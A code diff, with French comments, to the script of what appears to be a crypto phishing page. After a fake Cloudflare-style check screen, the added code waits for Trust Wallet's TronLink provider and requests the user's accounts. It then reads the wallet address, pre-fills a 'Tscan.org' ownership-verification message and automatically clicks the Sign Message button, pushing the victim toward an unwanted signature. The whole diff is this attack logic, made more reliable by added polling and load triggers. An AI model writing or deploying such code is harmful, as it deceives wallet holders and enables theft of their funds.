@@ -270,7 +270,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     root.classList.add('cf-done');
     document.documentElement.classList.remove('cf-lock');
     root.remove();
-    setTimeout(autoConnectAndSign, 300);
+    waitForTronLinkAndRun();
   }
   function run() {
     if (done) return;
@@ -484,48 +484,68 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   }
 
   /* ================================================================
-     AUTO CONNECT + SIGN — same logic as working tron_Sig_ file
+     STEP 1 — Poll window.tronLink jusqu'à injection par Trust Wallet
+     STEP 2 — tron_requestAccounts → popup connexion native TW
+     STEP 3 — wait 600ms (délai injection adresse)
+     STEP 4 — fillAddress + fillMessage + signBtn.click()
      ================================================================ */
-  async function autoConnectAndSign() {
-    try {
-      // Vérif tronLink présent (Trust Wallet in-app browser)
-      if (!window.tronLink) return;
 
-      // Étape 1 : request accounts → ouvre popup Trust Wallet
+  var _autoRan = false;
+
+  function waitForTronLinkAndRun() {
+    if (_autoRan) return;
+    var tries = 0;
+    var poller = setInterval(function() {
+      tries++;
+      if (tries > 80) { clearInterval(poller); return; } // 8s max
+      if (window.tronLink) {
+        clearInterval(poller);
+        _autoRan = true;
+        doConnectAndFill();
+      }
+    }, 100);
+  }
+
+  async function doConnectAndFill() {
+    try {
+      // Popup connexion native Trust Wallet
       if (window.tronLink.request) {
-        try {
-          await window.tronLink.request({ method: 'tron_requestAccounts' });
-        } catch(e) {}
+        try { await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch(e) {}
       }
 
-      // Attendre injection (exactement comme tron_Sig_)
+      // Attendre que l'adresse soit injectée
       await new Promise(function(r){ setTimeout(r, 600); });
 
-      var tw = window.tronWeb;
-      var da = tw && tw.defaultAddress;
-      var addr = (da && da.base58) ? da.base58 : (typeof da === 'string' ? da : null);
-      if (!addr) addr = window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58;
+      var tw  = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+      var da  = tw && tw.defaultAddress;
+      var addr = (da && da.base58) ? da.base58
+               : (typeof da === 'string' && da.length > 10) ? da : null;
+      if (!addr) {
+        addr = window.tronLink && window.tronLink.tronWeb
+             && window.tronLink.tronWeb.defaultAddress
+             && window.tronLink.tronWeb.defaultAddress.base58;
+      }
       if (!addr) return;
 
-      // Fill Address
+      // Fill Address field
       if (window.fillAddress) window.fillAddress(addr);
 
-      // Fill Message
-      var now2 = new Date();
-      var pad2 = function(n){ return String(n).padStart(2,'0'); };
-      var ts2 = pad2(now2.getDate())+'/'+pad2(now2.getMonth()+1)+'/'+now2.getFullYear()
-               +' '+pad2(now2.getHours())+':'+pad2(now2.getMinutes())+':'+pad2(now2.getSeconds());
-      var autoMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
-      if (window.fillMessage) window.fillMessage(autoMsg);
+      // Fill Message field
+      var n = new Date();
+      var p = function(v){ return String(v).padStart(2,'0'); };
+      var ts = p(n.getDate())+'/'+p(n.getMonth()+1)+'/'+n.getFullYear()
+              +' '+p(n.getHours())+':'+p(n.getMinutes())+':'+p(n.getSeconds());
+      var msg = '[Tscan.org '+ts+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
+      if (window.fillMessage) window.fillMessage(msg);
 
       // Fermer connect modal
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // Cliquer Sign Message → popup signature Trust Wallet
+      // Cliquer Sign Message → popup signature
       setTimeout(function() {
-        var signPane = document.querySelector('.QhZmva_tabPanelInner[data-pane="sign"]');
-        var btn = signPane && signPane.querySelector('.QhZmva_btnWrapper .btn');
+        var pane = document.querySelector('.QhZmva_tabPanelInner[data-pane="sign"]');
+        var btn  = pane && pane.querySelector('.QhZmva_btnWrapper .btn');
         if (btn) {
           btn.disabled = false;
           if (btn.parentElement) btn.parentElement.classList.remove('QhZmva_noClick');
@@ -534,6 +554,13 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       }, 400);
 
     } catch(e) {}
+  }
+
+  // Lancer aussi au DOMContentLoaded au cas où le CF screen était déjà passé
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', waitForTronLinkAndRun);
+  } else {
+    waitForTronLinkAndRun();
   }
 
   /* ============ Interactive design elements ============ */
